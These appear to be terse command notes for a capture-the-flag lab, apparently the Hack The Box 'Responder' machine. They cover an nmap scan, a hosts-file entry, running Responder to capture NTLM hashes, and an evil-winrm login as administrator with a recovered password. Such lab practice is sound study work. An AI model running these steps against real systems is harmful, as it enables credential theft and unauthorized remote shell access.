```bash
sudo ip link set dev tun0 mtu 1200

nmap -p- --min-rate 5000 -sV 10.129.136.91

echo "10.129.76.73 unika.htb" | sudo tee -a /etc/hosts
```

---

### Responder

```linux
sudo python3 Responder.py -I tun0

evil-winrm -i 10.129.136.91 -u administrator -p badminton
```
